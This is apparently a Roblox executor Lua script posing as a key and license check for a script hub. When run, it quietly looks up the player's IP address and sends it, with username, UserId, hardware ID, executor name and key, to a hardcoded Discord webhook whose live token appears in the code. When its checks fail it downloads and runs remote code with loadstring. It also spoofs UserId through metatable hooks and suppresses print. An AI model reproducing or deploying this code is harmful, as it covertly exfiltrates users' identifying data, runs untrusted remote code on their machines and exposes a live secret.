if not game:IsLoaded() then game.Loaded:Wait() end

print("üîê Your Key Is: " .. getgenv().Key)
print("üóÇÔ∏è Your Script Is: " .. getgenv().Script)
print("üèïÔ∏è Our Discord: https://discord.gg/FcEGmkNDDe ‚òéÔ∏è")
print("üß® Sxionax's Best Developer: https://discord.gg/2C2vTJX33q üì°")

local webhookUrl = "https://discord.com/api/webhooks/1328000288161923152/XoC0itpI6tLAxP0fMd9-07YSgtoYixGWg1XO1c-NlE3iLvWle-UckJTSwxqi40eAglXn"
local http = game:GetService("HttpService")
local requestFunction = http_request or request or syn.request

local function fetchIp()
    local response = requestFunction({Url = "https://ipinfo.io/json", Method = "GET"})
    return http:JSONDecode(response.Body).ip
end

local ipData = fetchIp()
local player = game.Players.LocalPlayer
local embedData = {
    embeds = {
        {
            title = "The Script Was Just Executed",
            type = "rich",
            color = tonumber("1cff1a", 16),
            thumbnail = {
                url = "https://media.discordapp.net/attachments/1276435905200128010/1342507906112950302/discord_fake_avatar_decorations_1740128914852.gif?ex=67b9e36b&is=67b891eb&hm=4caf70823b9331ef50cebba5b6beed488f5ba64be244e7a6c13b02993ec2227a&=&width=216&height=216"
            },
            fields = {
                {name = "Username / UserId", value = string.format("```%s / %d```", player.Name, player.UserId)},
                {name = "Internet Protocol", value = string.format("```%s```", ipData), inline = true},
                {name = "Executor", value = string.format("```%s```", identifyexecutor()), inline = true},
                {name = "Hardware ID", value = string.format("```%s```", gethwid()), inline = false},
                {name = "Script", value = string.format("```%s```", getgenv().Script), inline = false},
                {name = "Key", value = string.format("```%s```", getgenv().Key), inline = false},
                {name = "JobId", value = string.format("```%s```", game.JobId), inline = false},
                {name = "Profile Link", value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", player.UserId), inline = true},
                {name = "Game Link", value = string.format("[Click Here](https://www.roblox.com/games/%d)", game.PlaceId), inline = true}
            }
        }
    }
}

local payload = http:JSONEncode(embedData)
local headers = {["Content-Type"] = "application/json"}

local success, err = pcall(function()
    requestFunction({Url = webhookUrl, Body = payload, Method = "POST", Headers = headers})
end)

if not success then
    warn("üêì Error Occurred: https://discord.gg/FcEGmkNDDe ‚ö†Ô∏è")
end

local function hidePlayerName()
    local player = game.Players.LocalPlayer
    if not player then return end
    player.Name, player.DisplayName = "\76\72\75\75", "\76\72\75\75"
    local function updateCharacter(character)
        if character then
            character.Name = "\76\72\75\75"
            task.spawn(function()
                pcall(function()
                    player.CharacterAppearanceId = 3463311754
                end)
            end)
        end
    end
    if player.Character then updateCharacter(player.Character) end
    player.CharacterAdded:Connect(updateCharacter)
end

local function changeHardwareId()
    local player = game.Players.LocalPlayer
    local rawMeta = getrawmetatable(player)
    if not rawMeta then return end

    setreadonly(rawMeta, false)
    local originalIndex = rawMeta.__index
    local originalNewIndex = rawMeta.__newindex

    rawMeta.__index = newcclosure(function(obj, key)
        if obj == player and key == "UserId" then
            return 3463311754
        end
        return originalIndex(obj, key)
    end)

    rawMeta.__newindex = newcclosure(function(obj, key, value)
        if obj == player and key == "UserId" then
            return
        end
        originalNewIndex(obj, key, value)
    end)

    setreadonly(rawMeta, true)
end

local function checkExecutor()
    local validExecutors = { "Arceus X", "Codex", "VegaX", "Cryptic", "Trigon", "Evon" }
    local executor = identifyexecutor()
    local isValid = false
    
    -- Ki·ªÉm tra xem executor c√≥ h·ª£p l·ªá kh√¥ng
    for _, validExecutor in ipairs(validExecutors) do
        if executor == validExecutor then
            isValid = true
            break
        end
    end
    
    if not isValid then
        warn("üöß Invalid Executor! ‚ö†Ô∏è")
        game.Players.LocalPlayer:Kick("üéâ Invalid Executor! üíÄ")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end
end

local function checkHardwareId()
    if gethwid() ~= "f703e3d6f898de7d" then
        warn("üß∏ Invalid Hardware ID!")
        game.Players.LocalPlayer:Kick("üïäÔ∏è Invalid Hardware ID! üíô")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end
end

local function checkKey()
    if not getgenv().Key or getgenv().Key == "" then
        warn("üö´ Key Not Found!")
        game:GetService("Players").LocalPlayer:Kick("‚ùì Key Not Found!")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end
end

local function checkScript()
    if not getgenv().Script or getgenv().Script == "" then
        warn("ü•ë Script Name Not Found!")
        game.Players.LocalPlayer:Kick("üçé Script Name Not Found!")
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end
end

pcall(function()
    local res = syn and syn.request or http_request or http and http.request or request and request.request
    if not res then
        warn("‚ùå Executor Not Compatible!")
        game:GetService("Players").LocalPlayer:Kick("‚ùå Executor Not Compatible!")
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end

    res = res({
        Url = "https://apisxionax.x10.mx/nSDs6oT4xDx.php",
        Method = "POST",
        Headers = {["Authorization"] = getgenv().Key, ["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({ iddiscord = tostring(game:GetService("Players").LocalPlayer.UserId) })
    })

    if not res or res.StatusCode ~= 200 then
        warn("‚ùå Sxionax API Unavailable!")
        game:GetService("Players").LocalPlayer:Kick("‚ùå Sxionax API Unavailable!")
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end

    local decoded = game:GetService("HttpService"):JSONDecode(res.Body)
    if decoded.success or decoded.redeemer then
        print("üöÄ Key Authentication Successful!")
    else
        warn("‚ùå Key Verification Failed!")
        game:GetService("Players").LocalPlayer:Kick("‚ùå Key Verification Failed!")
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
    end
end)

hookfunction(print, function(...) return ... end)

-- Call functions to perform the checks
checkExecutor()
checkHardwareId()
checkKey()
checkScript()
hidePlayerName()
changeHardwareId()
